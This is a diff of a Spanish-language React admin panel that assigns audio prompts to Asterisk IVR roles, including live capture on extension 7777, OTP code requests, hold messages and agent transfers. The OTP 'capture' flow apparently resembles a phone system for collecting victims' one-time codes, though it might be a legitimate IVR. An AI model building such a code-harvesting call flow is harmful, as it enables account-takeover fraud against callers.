-          <div className="p-3 rounded-lg bg-slate-950/70 border border-slate-800 space-y-1.5">
-            <span className="text-[11px] text-slate-400 font-medium block">Audio actualmente asignado:</span>
-            <div className="flex items-center justify-between">
-              <span className="font-mono text-purple-300 font-bold text-xs truncate">
-                {current7777Audio}
-              </span>
-              {audios.find((a) => a.asteriskPath === current7777Audio) && (
-                <button
-                  onClick={() => {
-                    const match = audios.find((a) => a.asteriskPath === current7777Audio);
-                    if (match) handlePlayToggle(match);
-                  }}
-                  className="text-purple-400 hover:text-purple-300 p-1"
-                  title="Escuchar audio actual"
-                >
-                  <Play className="w-3.5 h-3.5" />
-                </button>
-              )}
-            </div>
-          </div>
-
-          <div className="p-3 rounded-lg bg-slate-950/70 border border-slate-800 space-y-1.5">
-            <span className="text-[11px] text-slate-400 font-medium block">Seleccionar de la Audioteca:</span>
-            <select
-              value={current7777Audio}
-              disabled={isAssigning7777}
-              onChange={(e) => handleAssignTo7777Direct(e.target.value)}
-              className="w-full px-2.5 py-1.5 rounded bg-slate-900 border border-slate-700 text-slate-200 text-xs font-mono focus:border-purple-500 focus:outline-none"
-            >
-              {audios.map((a) => (
-                <option key={a.id} value={a.asteriskPath}>
-                  {a.name} ({a.asteriskPath})
-                </option>
-              ))}
-            </select>
-          </div>
-
-          <div className="p-3 rounded-lg bg-slate-950/70 border border-slate-800 space-y-1.5 sm:col-span-2 lg:col-span-1">
-            <span className="text-[11px] text-slate-400 font-medium block">Comando CLI manual Asterisk:</span>
-            <div className="flex items-center justify-between bg-slate-900 px-2 py-1 rounded font-mono text-[11px] text-slate-300">
-              <span className="truncate">database put ivr_vars 7777_intro "{current7777Audio}"</span>
-              <button
-                onClick={() =>
-                  copyToClipboard(`asterisk -rx 'database put ivr_vars 7777_intro "${current7777Audio}"'`)
-                }
-                className="text-slate-400 hover:text-purple-400 p-1 shrink-0 ml-1"
-                title="Copiar comando de terminal"
-              >
-                <Copy className="w-3 h-3" />
-              </button>
-            </div>
-          </div>
-        </div>
+      {/* Section Title: Audioteca de Archivos */}
+      <div className="flex items-center justify-between pt-2">
+        <h3 className="text-base font-bold text-white flex items-center gap-2">
+          <span>Biblioteca de Locuciones Disponibles</span>
+          <span className="text-xs text-slate-400 font-normal">({audios.length} archivos en servidor)</span>
+        </h3>
+        <p className="text-xs text-slate-400 hidden sm:block">
+          Usa los botones rápidos de cada tarjeta para asignar el audio a cualquier mensaje del sistema en 1 clic.
+        </p>
       </div>
 
       {/* Audio Cards Grid */}
@@ -469,10 +754,19 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
           const isPlaying = playingAudioId === audio.id;
           const cat = categoryLabels[audio.category] || categoryLabels.custom;
 
+          // Check which roles this audio is currently assigned to
+          const assignedRoles = Object.entries(activeAssignments)
+            .filter(([_, path]) => path === audio.asteriskPath || path === `custom/${audio.fileName.replace(/\.wav$/, '')}`)
+            .map(([role]) => role as AudioRole);
+
           return (
             <div
               key={audio.id}
-              className="p-4 rounded-xl bg-slate-900 border border-slate-800 hover:border-slate-700 transition-all flex flex-col justify-between space-y-3"
+              className={`p-4 rounded-xl border transition-all flex flex-col justify-between space-y-3 ${
+                assignedRoles.length > 0
+                  ? 'bg-slate-900 border-emerald-500/40 shadow-md'
+                  : 'bg-slate-900 border-slate-800 hover:border-slate-700'
+              }`}
             >
               <div>
                 {/* Card Header & Category Badge */}
@@ -483,7 +777,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   <button
                     onClick={() => onDeleteAudio(audio.id)}
                     className="p-1 rounded text-slate-500 hover:text-rose-400 hover:bg-slate-800 transition-colors"
-                    title="Eliminar audio"
+                    title="Eliminar audio de la biblioteca"
                   >
                     <Trash2 className="w-3.5 h-3.5" />
                   </button>
@@ -491,6 +785,25 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
 
                 <h3 className="font-semibold text-white text-sm leading-snug">{audio.name}</h3>
                 <p className="text-xs text-slate-400 font-mono mt-0.5">{audio.fileName}</p>
+
+                {/* Active in Roles Badge */}
+                {assignedRoles.length > 0 && (
+                  <div className="mt-2 flex items-center gap-1.5 flex-wrap">
+                    <span className="text-[10px] text-emerald-400 font-semibold">Activo en:</span>
+                    {assignedRoles.map((r) => {
+                      const rConf = SYSTEM_ROLES.find((sr) => sr.role === r);
+                      return (
+                        <span
+                          key={r}
+                          className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 flex items-center gap-1"
+                        >
+                          <span>✓</span>
+                          <span>{rConf?.badge || r}</span>
+                        </span>
+                      );
+                    })}
+                  </div>
+                )}
               </div>
 
               {/* Audio Player & Waveform simulation */}
@@ -548,42 +861,102 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                 </button>
               </div>
 
-              {/* Action Assignment buttons */}
-              <div className="pt-2 border-t border-slate-800 flex items-center justify-between gap-1.5 flex-wrap">
-                <button
-                  onClick={() => onAssignToPress1(audio.id)}
-                  className="text-xs px-2 py-1 rounded bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20 transition-colors flex items-center gap-1 font-medium"
-                  title="Asignar este audio a la bienvenida de Press 1"
-                >
-                  <span>Intro Press 1</span>
-                </button>
-                <button
-                  onClick={() => onAssignToAgentTransfer?.(audio.id)}
-                  className="text-xs px-2 py-1 rounded bg-amber-500/10 text-amber-300 border border-amber-500/20 hover:bg-amber-500/20 transition-colors flex items-center gap-1 font-medium"
-                  title="Asignar este audio a la transferencia de asesor (cuando presiona 1)"
-                >
-                  <span>Asesor (1)</span>
-                </button>
-                <button
-                  onClick={() => onAssignToOtp(audio.id)}
-                  className="text-xs px-2 py-1 rounded bg-blue-500/10 text-blue-300 border border-blue-500/20 hover:bg-blue-500/20 transition-colors flex items-center gap-1 font-medium"
-                  title="Asignar este audio a la instrucción de OTP"
-                >
-                  <span>Captura OTP</span>
-                </button>
-                <button
-                  onClick={() => handleAssignTo7777Direct(audio.asteriskPath, audio.id)}
-                  className={`text-xs px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
-                    current7777Audio === audio.asteriskPath
-                      ? 'bg-purple-500 text-white shadow-sm shadow-purple-500/30 font-bold border border-purple-400'
-                      : 'bg-purple-500/10 text-purple-300 border border-purple-500/20 hover:bg-purple-500/20'
-                  }`}
-                  title="Asignar este audio como la Bienvenida de la Extensión 7777"
-                >
-                  <Sparkles className="w-3 h-3" />
-                  <span>Ext 7777</span>
-                  {current7777Audio === audio.asteriskPath && <span className="text-[10px]">✓</span>}
-                </button>
+              {/* Action Assignment buttons (1-Click Change) */}
+              <div className="pt-2 border-t border-slate-800 space-y-1.5">
+                <span className="text-[10px] text-slate-400 font-medium block">Asignar en 1 clic como:</span>
+                <div className="flex items-center gap-1.5 flex-wrap">
+                  <button
+                    onClick={() => handleAssignRoleDirect('welcome_7777', audio.asteriskPath)}
+                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                      activeAssignments.welcome_7777 === audio.asteriskPath
+                        ? 'bg-purple-500 text-white font-bold shadow-sm shadow-purple-500/20'
+                        : 'bg-purple-500/10 text-purple-300 border border-purple-500/20 hover:bg-purple-500/20'
+                    }`}
+                    title="Asignar como bienvenida de la extensión 7777"
+                  >
+                    <Sparkles className="w-3 h-3" />
+                    <span>Ext 7777</span>
+                    {activeAssignments.welcome_7777 === audio.asteriskPath && <span>✓</span>}
+                  </button>
+
+                  <button
+                    onClick={() => handleAssignRoleDirect('press1_welcome', audio.asteriskPath)}
+                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                      activeAssignments.press1_welcome === audio.asteriskPath
+                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20'
+                        : 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20'
+                    }`}
+                    title="Asignar como bienvenida inicial de Press 1"
+                  >
+                    <span>Intro Press 1</span>
+                    {activeAssignments.press1_welcome === audio.asteriskPath && <span>✓</span>}
+                  </button>
+
+                  <button
+                    onClick={() => handleAssignRoleDirect('agent_transfer', audio.asteriskPath)}
+                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                      activeAssignments.agent_transfer === audio.asteriskPath
+                        ? 'bg-amber-500 text-black font-bold shadow-sm shadow-amber-500/20'
+                        : 'bg-amber-500/10 text-amber-300 border border-amber-500/20 hover:bg-amber-500/20'
+                    }`}
+                    title="Asignar a la transferencia hacia el asesor (al pulsar 1)"
+                  >
+                    <span>Asesor (1)</span>
+                    {activeAssignments.agent_transfer === audio.asteriskPath && <span>✓</span>}
+                  </button>
+
+                  <button
+                    onClick={() => handleAssignRoleDirect('otp_welcome', audio.asteriskPath)}
+                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                      activeAssignments.otp_welcome === audio.asteriskPath
+                        ? 'bg-blue-500 text-white font-bold shadow-sm shadow-blue-500/20'
+                        : 'bg-blue-500/10 text-blue-300 border border-blue-500/20 hover:bg-blue-500/20'
+                    }`}
+                    title="Asignar como locución de solicitud de código OTP"
+                  >
+                    <span>Pedir OTP</span>
+                    {activeAssignments.otp_welcome === audio.asteriskPath && <span>✓</span>}
+                  </button>
+
+                  <button
+                    onClick={() => handleAssignRoleDirect('otp_wait', audio.asteriskPath)}
+                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                      activeAssignments.otp_wait === audio.asteriskPath
+                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20'
+                        : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
+                    }`}
+                    title="Asignar como audio en espera durante la validación del código"
+                  >
+                    <span>Espera OTP</span>
+                    {activeAssignments.otp_wait === audio.asteriskPath && <span>✓</span>}
+                  </button>
+
+                  <button
+                    onClick={() => handleAssignRoleDirect('otp_success', audio.asteriskPath)}
+                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                      activeAssignments.otp_success === audio.asteriskPath
+                        ? 'bg-emerald-500 text-black font-bold shadow-sm shadow-emerald-500/20'
+                        : 'bg-emerald-500/10 text-emerald-300 border border-emerald-500/20 hover:bg-emerald-500/20'
+                    }`}
+                    title="Asignar como audio de código validado con éxito"
+                  >
+                    <span>Éxito</span>
+                    {activeAssignments.otp_success === audio.asteriskPath && <span>✓</span>}
+                  </button>
+
+                  <button
+                    onClick={() => handleAssignRoleDirect('otp_failure', audio.asteriskPath)}
+                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                      activeAssignments.otp_failure === audio.asteriskPath
+                        ? 'bg-rose-500 text-white font-bold shadow-sm shadow-rose-500/20'
+                        : 'bg-rose-500/10 text-rose-300 border border-rose-500/20 hover:bg-rose-500/20'
+                    }`}
+                    title="Asignar como audio de código inválido / reintento"
+                  >
+                    <span>Fallo</span>
+                    {activeAssignments.otp_failure === audio.asteriskPath && <span>✓</span>}
+                  </button>
+                </div>
               </div>
             </div>
           );
@@ -597,7 +970,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
             <div className="flex items-center justify-between pb-3 border-b border-slate-800">
               <h3 className="text-lg font-bold text-white flex items-center gap-2">
                 <Volume2 className="w-5 h-5 text-emerald-400" />
-                <span>Registrar Audio en Audioteca</span>
+                <span>Registrar Audio en Asterisk</span>
               </h3>
               <button
                 onClick={() => setIsUploadModalOpen(false)}
@@ -624,7 +997,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
 
               <div>
                 <label className="block text-slate-300 font-medium mb-1">
-                  Categoría o Rol en Asterisk
+                  Mensaje o Rol en la Central Telefónica
                 </label>
                 <select
                   value={newAudioCategory}
@@ -632,16 +1005,32 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   className="w-full px-3 py-2 rounded-md bg-slate-950 border border-slate-800 text-white focus:border-emerald-500 focus:outline-none text-xs"
                 >
                   <option value="welcome_7777">Bienvenida Extensión 7777 (Captura en Vivo)</option>
-                  <option value="press1_welcome">Bienvenida IVR Press 1</option>
-                  <option value="agent_transfer">Transferencia a Asesor (Opción 1 - "Un momento por favor...")</option>
-                  <option value="press1_invalid">Opción Inválida Press 1</option>
-                  <option value="otp_welcome">Solicitud Dígitos OTP</option>
-                  <option value="otp_success">Validación Correcta OTP</option>
-                  <option value="otp_failure">Error / Bloqueo OTP</option>
+                  <option value="press1_welcome">Bienvenida IVR Press 1 (Al contestar llamada)</option>
+                  <option value="agent_transfer">Transferencia a Asesor ("Un momento por favor...")</option>
+                  <option value="press1_invalid">Opción Inválida en Menú Press 1</option>
+                  <option value="otp_welcome">Solicitud Dígitos OTP ("Ingrese su código...")</option>
+                  <option value="otp_wait">Validación en Espera ("Validando información...")</option>
+                  <option value="otp_success">Validación Correcta ("Operación asegurada")</option>
+                  <option value="otp_failure">Código Inválido ("Token incorrecto, reintente")</option>
                   <option value="hold_music">Música en Espera (MOH)</option>
                   <option value="custom">Anuncio / General</option>
                 </select>
               </div>
+
+              {/* Auto activate checkbox */}
+              {newAudioCategory !== 'custom' && newAudioCategory !== 'hold_music' && (
+                <label className="flex items-center gap-2 p-2.5 rounded-lg bg-emerald-500/10 border border-emerald-500/20 cursor-pointer">
+                  <input
+                    type="checkbox"
+                    checked={autoActivateRole}
+                    onChange={(e) => setAutoActivateRole(e.target.checked)}
+                    className="rounded border-slate-700 text-emerald-500 focus:ring-0"
+                  />
+                  <span className="text-emerald-300 text-[11px] font-medium">
+                    Activar inmediatamente como el audio en vivo para este rol en Asterisk
+                  </span>
+                </label>
+              )}
 
               <div className="p-3 rounded bg-slate-950 border border-slate-800 text-slate-400 space-y-1">
                 <div className="flex justify-between">
@@ -659,7 +1048,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
               </div>
 
               <div className="p-2.5 rounded bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 text-[11px]">
-                💡 Asterisk buscará este audio en <code className="font-mono">/var/lib/asterisk/sounds/custom/{stagedFileName.replace(/\.[^/.]+$/, '')}</code>.
+                💡 El servidor convertirá automáticamente este archivo a <strong>8000Hz 16-bit Mono PCM</strong> y lo guardará en <code className="font-mono">/var/lib/asterisk/sounds/custom/</code>.
               </div>
 
               <div className="flex justify-end space-x-2 pt-2 border-t border-slate-800">
@@ -674,7 +1063,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   type="submit"
                   className="px-4 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-bold"
                 >
-                  Guardar en Audioteca
+                  Guardar y Sincronizar
                 </button>
               </div>
             </form>
